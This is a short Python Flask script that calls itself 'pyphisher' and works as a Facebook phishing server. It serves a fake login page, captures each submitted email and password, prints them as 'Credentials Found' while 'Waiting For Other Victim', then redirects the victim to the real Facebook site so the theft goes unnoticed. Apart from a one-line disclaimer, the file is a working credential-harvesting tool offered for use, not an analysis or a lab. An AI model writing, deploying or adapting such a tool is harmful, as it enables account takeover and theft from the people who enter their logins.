from flask import *
from termcolor import colored
from prettytable import PrettyTable

app = Flask(__name__)

print("""    _           _     _
 _ __  _   _| |__  _ __ (_)___| |__   ___ _ __
| '_ \| | | |  _ \| '_ \| / __| '_ \ / _ | '__|
| |_) | |_| | | | | |_) | \__ | | | |  __| |
| .__/ \__, |_| |_| .__/|_|___|_| |_|\___|_|
|_|    |___/      |_|



Disclaimer: I'm Not Responsible For Your Action

""")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/facebook',methods = ['POST'])  
def facebook():  
      uname=request.form['email']  
      passwrd=request.form['password']
      x = PrettyTable()
      x.field_names = ["Email","password"]
      print(x.add_row([uname,passwrd]))
      print('''Credentials Found:    ''')
      print(colored(x, 'cyan'))
      print(''' Waiting For Other Victim ''')
 
 
      return redirect("http://www.facebook.com")
      

if __name__ == "__main__":

     app.run(debug=True,host='0.0.0.0',port=5000)
     